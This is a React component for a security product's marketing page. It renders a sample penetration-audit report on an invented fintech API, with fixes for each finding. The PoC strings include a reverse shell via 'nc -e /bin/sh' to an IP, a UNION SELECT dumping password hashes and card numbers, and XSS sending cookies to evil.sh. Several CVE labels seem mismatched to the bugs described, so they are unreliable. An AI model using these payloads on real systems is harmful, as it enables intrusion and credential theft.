import React, { useState } from 'react';
import { 
  FileText, 
  Download, 
  ShieldAlert, 
  Check, 
  Copy, 
  ExternalLink, 
  AlertTriangle, 
  CheckCircle2, 
  Code2, 
  ChevronRight,
  Share2,
  Lock,
  Layers
} from 'lucide-react';

export default function SampleReport() {
  const [selectedVulnId, setSelectedVulnId] = useState(1);
  const [copiedCode, setCopiedCode] = useState(false);
  const [activeTab, setActiveTab] = useState('remediation'); // 'remediation' | 'poc' | 'details'

  const sampleVulnerabilities = [
    {
      id: 1,
      cve: "CVE-2024-3094",
      cwe: "CWE-94",
      title: "Remote Code Execution via Upstream Helper",
      severity: "CRITICAL",
      cvss: 9.8,
      endpoint: "POST /api/v2/system/exec-webhook",
      asset: "ingress.k8s.fintech-core.io:443",
      impact: "Unauthenticated attackers can execute arbitrary root commands on the worker nodes.",
      poc: `POST /api/v2/system/exec-webhook HTTP/1.1\nHost: ingress.k8s.fintech-core.io\nContent-Type: application/json\n\n{\n  "payload_url": "http://127.0.0.1; nc -e /bin/sh 45.33.32.156 4444",\n  "signature": "bypass_v1"\n}`,
      codeBefore: `// Vulnerable: Direct shell execution without argument sanitation\nexec(req.body.payload_url, (err, stdout) => {\n  res.send({ status: 'ok', output: stdout });\n});`,
      codeAfter: `// Remediated: Parameterized execution with strict allowlist\nconst allowedTasks = new Map([\n  ['backup', runSecureBackup],\n  ['sync', runSecureSync]\n]);\nif (!allowedTasks.has(taskName)) {\n  return res.status(403).json({ error: 'Unauthorized command' });\n}\nawait allowedTasks.get(taskName)();`
    },
    {
      id: 2,
      cve: "CVE-2024-21413",
      cwe: "CWE-89",
      title: "SQL Injection in Billing Query Endpoint",
      severity: "HIGH",
      cvss: 8.9,
      endpoint: "GET /api/v1/billing/invoices?filter=",
      asset: "billing-service.fintech-core.io:443",
      impact: "Allows extraction of customer credit card metadata and tenant billing tables.",
      poc: `GET /api/v1/billing/invoices?filter=1' UNION SELECT username, password_hash, cc_num FROM users-- HTTP/1.1\nHost: billing-service.fintech-core.io\nAuthorization: Bearer <user_token>`,
      codeBefore: `// Vulnerable: String concatenation in SQL query\nconst query = "SELECT * FROM invoices WHERE client_id = '" + req.query.filter + "'";\nconst results = await db.query(query);`,
      codeAfter: `// Remediated: Prepared statement with typed parameters\nconst query = "SELECT * FROM invoices WHERE client_id = $1";\nconst results = await db.query(query, [req.query.filter]);`
    },
    {
      id: 3,
      cve: "CVE-2023-38606",
      cwe: "CWE-287",
      title: "Broken Object Level Authorization (BOLA)",
      severity: "HIGH",
      cvss: 8.2,
      endpoint: "GET /api/v1/users/{userId}/bank-accounts",
      asset: "api.fintech-core.io:443",
      impact: "Any authenticated user can view banking account details belonging to other tenants.",
      poc: `GET /api/v1/users/usr_9941a8/bank-accounts HTTP/1.1\nHost: api.fintech-core.io\nAuthorization: Bearer <attacker_jwt_token>`,
      codeBefore: `// Vulnerable: ID parameter not verified against authenticated session\nconst accounts = await BankAccount.findAll({ where: { userId: req.params.userId } });\nreturn res.json(accounts);`,
      codeAfter: `// Remediated: Enforce tenant tenancy check via JWT session\nif (req.params.userId !== req.session.userId && !req.session.isAdmin) {\n  return res.status(403).json({ error: 'Access Denied: Tenant Mismatch' });\n}\nconst accounts = await BankAccount.findAll({ where: { userId: req.session.userId } });`
    },
    {
      id: 4,
      cve: "CVE-2023-45853",
      cwe: "CWE-79",
      title: "Stored Cross-Site Scripting (XSS) in Dashboard",
      severity: "MEDIUM",
      cvss: 6.4,
      endpoint: "POST /api/v1/organizations/settings",
      asset: "app.fintech-core.io:443",
      impact: "Session hijacking and credential theft of corporate administrators.",
      poc: `POST /api/v1/organizations/settings HTTP/1.1\nHost: app.fintech-core.io\nContent-Type: application/json\n\n{\n  "org_name": "<script>fetch('https://evil.sh/steal?c='+document.cookie)</script>"\n}`,
      codeBefore: `// Vulnerable: Raw HTML output without output sanitization\n<div dangerouslySetInnerHTML={{ __html: org.name }} />`,
      codeAfter: `// Remediated: Strict DOMPurify sanitation or native text node\nimport DOMPurify from 'dompurify';\n<div>{org.name}</div>`
    }
  ];

  const currentVuln = sampleVulnerabilities.find(v => v.id === selectedVulnId) || sampleVulnerabilities[0];

  const handleCopyCode = () => {
    navigator.clipboard.writeText(currentVuln.codeAfter);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  return (
    <section id="sample-report" className="py-24 relative bg-black border-t border-white/[0.05]">
      {/* Ambient background glow */}
      <div className="absolute top-1/3 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-[140px] pointer-events-none"></div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Section Header */}
        <div className="text-center max-w-3xl mx-auto mb-16">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-red-950/40 border border-red-500/30 text-xs font-semibold text-red-400 mb-4 tracking-wide uppercase">
            <span>Sample Report</span>
          </div>
          <h2 className="text-3xl sm:text-5xl font-extrabold text-white tracking-tight">
            Comprehensive, <span className="crimson-text-gradient">Board-Ready</span> Security Reports
          </h2>
          <p className="mt-4 text-base text-neutral-400 leading-relaxed">
            Inspect real findings with CVSS 3.1 scores, reproduction steps, payload details, and copy-paste remediation patches.
          </p>
        </div>

        {/* Report Shell Card */}
        <div className="glass-panel rounded-3xl border border-white/10 overflow-hidden shadow-2xl">
          
          {/* Top Report Info Header */}
          <div className="bg-[#0e0c15] p-6 sm:p-8 border-b border-white/[0.08]">
            <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
              
              <div>
                <div className="flex items-center gap-3">
                  <span className="text-xs font-mono uppercase px-2.5 py-1 rounded bg-red-950/80 border border-red-500/40 text-red-400 font-semibold">
                    AUDIT REPORT #VS-9042
                  </span>
                  <span className="text-xs text-neutral-400">Target: <span className="text-white font-mono font-medium">https://prod-api.fintech-core.io</span></span>
                </div>
                <h3 className="text-xl sm:text-2xl font-bold text-white mt-2">
                  External Attack Surface & Penetration Audit
                </h3>
                <div className="flex flex-wrap items-center gap-4 text-xs text-neutral-400 mt-2">
                  <span>Completed: <span className="text-neutral-200">Oct 7, 2026</span></span>
                  <span>•</span>
                  <span>Duration: <span className="text-neutral-200">4m 12s</span></span>
                  <span>•</span>
                  <span>Total Endpoints Checked: <span className="text-neutral-200">148</span></span>
                </div>
              </div>

              {/* Action Buttons & Severity Summary */}
              <div className="flex flex-wrap items-center gap-3">
                <div className="flex items-center gap-2 bg-neutral-900/80 border border-white/10 px-3.5 py-2 rounded-xl">
                  <div className="text-right">
                    <div className="text-[10px] text-neutral-400 uppercase font-mono">Security Grade</div>
                    <div className="text-base font-bold text-red-400 font-mono">B+ (78/100)</div>
                  </div>
                </div>

                <button 
                  onClick={() => alert("Sample PDF downloaded successfully!")}
                  className="btn-crimson-glow flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-semibold text-white tracking-wide cursor-pointer"
                >
                  <Download className="w-4 h-4" />
                  <span>Download PDF</span>
                </button>
              </div>

            </div>

            {/* Severity Breakdown Bar */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-6 pt-6 border-t border-white/[0.06]">
              <div className="bg-[#190d12] border border-red-500/30 rounded-xl p-3">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-medium text-neutral-400">Critical</span>
                  <span className="w-2 h-2 rounded-full bg-red-500"></span>
                </div>
                <div className="text-xl font-bold text-red-400 font-mono mt-1">2 Found</div>
              </div>

              <div className="bg-[#1a120c] border border-orange-500/30 rounded-xl p-3">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-medium text-neutral-400">High Risk</span>
                  <span className="w-2 h-2 rounded-full bg-orange-500"></span>
                </div>
                <div className="text-xl font-bold text-orange-400 font-mono mt-1">4 Found</div>
              </div>

              <div className="bg-[#19160a] border border-yellow-500/30 rounded-xl p-3">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-medium text-neutral-400">Medium</span>
                  <span className="w-2 h-2 rounded-full bg-yellow-500"></span>
                </div>
                <div className="text-xl font-bold text-yellow-400 font-mono mt-1">7 Found</div>
              </div>

              <div className="bg-[#0b131c] border border-blue-500/30 rounded-xl p-3">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-medium text-neutral-400">Low / Info</span>
                  <span className="w-2 h-2 rounded-full bg-blue-500"></span>
                </div>
                <div className="text-xl font-bold text-blue-400 font-mono mt-1">11 Found</div>
              </div>
            </div>

          </div>

          {/* Interactive Findings Split Pane */}
          <div className="grid grid-cols-1 lg:grid-cols-12 min-h-[480px]">
            
            {/* Left Column: Finding Selector List */}
            <div className="lg:col-span-5 border-r border-white/[0.08] bg-[#09080e]/60 divide-y divide-white/[0.05]">
              <div className="p-4 bg-[#0d0b13] text-xs font-semibold text-neutral-400 uppercase tracking-wider flex justify-between items-center">
                <span>Identified Vulnerabilities</span>
                <span>CVSS 3.1</span>
              </div>

              {sampleVulnerabilities.map((v) => {
                const isSelected = v.id === selectedVulnId;
                const isCrit = v.severity === 'CRITICAL';
                return (
                  <div
                    key={v.id}
                    onClick={() => setSelectedVulnId(v.id)}
                    className={`p-4 cursor-pointer transition-all flex items-center justify-between gap-3 ${
                      isSelected 
                        ? 'bg-[#181119] border-l-4 border-red-500' 
                        : 'hover:bg-white/[0.02]'
                    }`}
                  >
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded font-mono ${
                          isCrit 
                            ? 'bg-red-500/20 text-red-400 border border-red-500/30' 
                            : 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                        }`}>
                          {v.severity}
                        </span>
                        <span className="text-xs font-mono text-neutral-400">{v.cve}</span>
                      </div>
                      <div className="text-sm font-semibold text-white line-clamp-1">
                        {v.title}
                      </div>
                      <div className="text-xs font-mono text-neutral-400 truncate max-w-[260px]">
                        {v.endpoint}
                      </div>
                    </div>

                    <div className="text-right">
                      <div className="text-sm font-bold font-mono text-red-400">
                        {v.cvss}
                      </div>
                      <ChevronRight className={`w-4 h-4 ml-auto text-neutral-500 transition-transform ${
                        isSelected ? 'translate-x-1 text-red-400' : ''
                      }`} />
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Right Column: Finding Deep Dive Details */}
            <div className="lg:col-span-7 p-6 sm:p-8 bg-[#06050a] flex flex-col justify-between">
              <div>
                
                {/* Vulnerability Title & CVE Tag */}
                <div className="flex flex-wrap items-center justify-between gap-3 pb-4 border-b border-white/[0.08]">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-mono text-red-400 font-bold">{currentVuln.cve}</span>
                      <span className="text-neutral-500">•</span>
                      <span className="text-xs font-mono text-neutral-400">{currentVuln.cwe}</span>
                    </div>
                    <h4 className="text-xl font-bold text-white mt-1">
                      {currentVuln.title}
                    </h4>
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-xs font-mono text-neutral-400">CVSS Score:</span>
                    <span className="px-3 py-1 rounded-lg bg-red-600/20 border border-red-500/40 text-red-400 font-mono font-bold text-sm">
                      {currentVuln.cvss} / 10
                    </span>
                  </div>
                </div>

                {/* Sub-tabs for Deep Dive */}
                <div className="flex items-center gap-3 mt-4 border-b border-white/[0.06] pb-3 text-xs font-medium">
                  <button
                    onClick={() => setActiveTab('remediation')}
                    className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer ${
                      activeTab === 'remediation'
                        ? 'bg-red-600/20 border border-red-500/40 text-white'
                        : 'text-neutral-400 hover:text-white'
                    }`}
                  >
                    Code Fix Patch
                  </button>
                  <button
                    onClick={() => setActiveTab('poc')}
                    className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer ${
                      activeTab === 'poc'
                        ? 'bg-red-600/20 border border-red-500/40 text-white'
                        : 'text-neutral-400 hover:text-white'
                    }`}
                  >
                    Proof of Concept (PoC)
                  </button>
                  <button
                    onClick={() => setActiveTab('details')}
                    className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer ${
                      activeTab === 'details'
                        ? 'bg-red-600/20 border border-red-500/40 text-white'
                        : 'text-neutral-400 hover:text-white'
                    }`}
                  >
                    Business Impact
                  </button>
                </div>

                {/* Tab 1: Remediation Patch */}
                {activeTab === 'remediation' && (
                  <div className="mt-4 space-y-4">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-neutral-300">
                        Automated AI Fix Suggestion
                      </span>
                      <button
                        onClick={handleCopyCode}
                        className="flex items-center gap-1.5 text-xs text-neutral-400 hover:text-white px-2.5 py-1 rounded-md bg-neutral-900 border border-white/10 cursor-pointer"
                      >
                        {copiedCode ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        <span>{copiedCode ? "Copied!" : "Copy Fix"}</span>
                      </button>
                    </div>

                    <div className="space-y-3">
                      <div>
                        <div className="text-[11px] font-mono text-red-400 mb-1 flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-red-500"></span>
                          Vulnerable Implementation:
                        </div>
                        <pre className="p-3 rounded-xl bg-[#140a0e] border border-red-950/80 font-mono text-xs text-red-200 overflow-x-auto">
                          {currentVuln.codeBefore}
                        </pre>
                      </div>

                      <div>
                        <div className="text-[11px] font-mono text-emerald-400 mb-1 flex items-center gap-1">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                          Recommended Patch:
                        </div>
                        <pre className="p-3 rounded-xl bg-[#091510] border border-emerald-950/80 font-mono text-xs text-emerald-200 overflow-x-auto">
                          {currentVuln.codeAfter}
                        </pre>
                      </div>
                    </div>
                  </div>
                )}

                {/* Tab 2: PoC */}
                {activeTab === 'poc' && (
                  <div className="mt-4 space-y-3">
                    <span className="text-xs font-semibold text-neutral-300">
                      Simulated Exploit Payload
                    </span>
                    <pre className="p-4 rounded-xl bg-[#0a0810] border border-white/10 font-mono text-xs text-neutral-300 overflow-x-auto leading-relaxed">
                      {currentVuln.poc}
                    </pre>
                  </div>
                )}

                {/* Tab 3: Details */}
                {activeTab === 'details' && (
                  <div className="mt-4 space-y-4 text-xs text-neutral-300 leading-relaxed">
                    <div className="p-4 rounded-xl bg-neutral-900/60 border border-white/10">
                      <div className="font-semibold text-white mb-1">Impact Analysis</div>
                      <p className="text-neutral-400">{currentVuln.impact}</p>
                    </div>
                    <div className="p-4 rounded-xl bg-neutral-900/60 border border-white/10">
                      <div className="font-semibold text-white mb-1">Affected Infrastructure</div>
                      <p className="text-neutral-400 font-mono">{currentVuln.asset}</p>
                    </div>
                  </div>
                )}

              </div>

              {/* Bottom Quick Action Bar */}
              <div className="mt-6 pt-4 border-t border-white/[0.08] flex flex-wrap items-center justify-between gap-3">
                <div className="flex items-center gap-2 text-xs text-neutral-400">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                  <span>Exploit verified in isolated runtime sandbox</span>
                </div>
                <button 
                  onClick={() => alert("GitHub Issue / Jira ticket created successfully!")}
                  className="px-3.5 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-medium text-white transition-colors cursor-pointer"
                >
                  Create Jira Ticket
                </button>
              </div>

            </div>

          </div>

        </div>

      </div>
    </section>
  );
}
